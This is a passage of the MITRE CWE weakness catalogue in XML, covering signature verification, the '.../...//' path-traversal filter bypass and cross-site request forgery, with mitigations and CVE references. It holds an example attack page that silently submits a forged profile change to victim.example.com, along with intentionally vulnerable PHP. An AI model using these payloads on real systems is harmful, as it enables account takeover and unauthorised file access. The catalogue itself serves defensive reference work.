               <Body_Text>The JAR file that was potentially downloaded from an untrusted source is created without verifying the signature (if present). An alternate constructor that accepts a boolean verify parameter should be used instead.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1796</Reference>
               <Description>Does not properly verify signatures for "trusted" entities.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1796</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2181</Reference>
               <Description>Insufficient verification allows spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2181</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2182</Reference>
               <Description>Insufficient verification allows spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2182</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1706</Reference>
               <Description>Accepts a configuration file without a Message Integrity Check (MIC) signature.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1706</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Improperly Verified Signature</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="463"/>
            <Related_Attack_Pattern CAPEC_ID="475"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-05-27">Improperly Verified Signature</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="35" Name="Path Traversal: '.../...//'" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory.</Description>
         <Extended_Description>
            <xhtml:p>This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.</xhtml:p>
            <xhtml:p>The '.../...//' manipulation is useful for bypassing some path traversal protection schemes. If "../" is filtered in a sequential fashion, as done by some regular expression engines, then ".../...//" can collapse into the "../" unsafe value (CWE-182). Removing the first "../" yields "....//"; the second removal yields "../". Depending on the algorithm, the product could be susceptible to CWE-34 but not CWE-35, or vice versa.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="23" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-2169</Reference>
               <Description>chain: ".../...//" bypasses protection mechanism using regexp's that remove "../" resulting in collapse into an unsafe value "../" (CWE-182) and resultant path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2169</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0202</Reference>
               <Description>".../....///" bypasses regexp's that remove "./" and "../"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0202</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>'.../...//'</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Path Issue - Doubled Triple Dot Slash - '.../...//'</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="352" Name="Cross-Site Request Forgery (CSRF)" Abstraction="Compound" Structure="Composite" Status="Stable">
         <Description>The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.</Description>
         <Extended_Description>When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="Requires" CWE_ID="346" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="441" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="642" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="613" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Session Riding</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross Site Reference Forgery</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>XSRF</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual analysis can be useful for finding this weakness, and for minimizing false positives assuming an understanding of business logic. However, it might not achieve desired code coverage within limited time constraints. For black-box analysis, if credentials are not known for privileged accounts, then the most security-critical portions of the application may not receive sufficient attention.</xhtml:p>
                  <xhtml:p>Consider using OWASP CSRFTester to identify potential issues and aid in manual analysis.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.</Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330]</xhtml:p>
                  <xhtml:p>Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use the "double-submitted cookie" method as described by Felten and Zeller:</xhtml:p>
                  <xhtml:p>When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.</xhtml:p>
                  <xhtml:p>Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.</xhtml:p>
                  <xhtml:p>This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]</xhtml:p>
               </Description>
               <Effectiveness_Notes>Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use the GET method for any request that triggers a state change.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79). An attacker could use XSS to generate a spoofed Referer, or to generate a malicious request from a page whose Referer would be allowed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.</Intro_Text>
               <Body_Text>The following HTML is intended to allow a user to update a profile.</Body_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;form action="/url/profile.php" method="post"&gt;<xhtml:br/>&lt;input type="text" name="firstname"/&gt;<xhtml:br/>&lt;input type="text" name="lastname"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="text" name="email"/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Update"/&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>profile.php contains the following code.</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>// initiate the session in order to validate sessions<xhtml:br/>
                     <xhtml:br/>session_start();<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//if the session is registered to a valid user then allow update</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>if (! session_is_registered("username")) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>echo "invalid session detected!";<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// Redirect user to login page</xhtml:i>
                           <xhtml:br/>[...]<xhtml:br/>
                           <xhtml:br/>exit;</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// The user session is valid, so process the request</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// and update the information</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>update_profile();<xhtml:br/>
                     <xhtml:br/>function update_profile {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// read in the data from $POST and send an update</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// to the database</xhtml:i>
                           <xhtml:br/>SendUpdateToDatabase($_SESSION['username'], $_POST['email']);<xhtml:br/>[...]<xhtml:br/>echo "Your profile has been successfully updated.";</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.</Body_Text>
               <Body_Text>The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:</Body_Text>
               <Example_Code Nature="Attack" Language="HTML">
                  <xhtml:div>&lt;SCRIPT&gt;<xhtml:br/>function SendAttack () {<xhtml:div style="margin-left:1em;">form.email = "attacker@example.com";<xhtml:br/>
                        <xhtml:i>// send to profile.php</xhtml:i>
                        <xhtml:br/>form.submit();</xhtml:div>}<xhtml:br/>&lt;/SCRIPT&gt;<xhtml:br/>
                     <xhtml:br/>&lt;BODY onload="javascript:SendAttack();"&gt;<xhtml:br/>
                     <xhtml:br/>&lt;form action="http://victim.example.com/profile.php" id="form" method="post"&gt;<xhtml:br/>&lt;input type="hidden" name="firstname" value="Funny"&gt;<xhtml:br/>&lt;input type="hidden" name="lastname" value="Joke"&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="hidden" name="email"&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.</Body_Text>
               <Body_Text>Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-1703</Reference>
               <Description>Add user accounts via a URL in an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1703</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1995</Reference>
               <Description>Add user accounts via a URL in an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1995</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1967</Reference>
               <Description>Arbitrary code execution by specifying the code in a crafted img tag or URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1842</Reference>
               <Description>Gain administrative privileges via a URL in an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1842</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1947</Reference>
               <Description>Delete a victim's information via a URL or an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1947</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2059</Reference>
               <Description>Change another user's settings via a URL or an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2059</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1674</Reference>
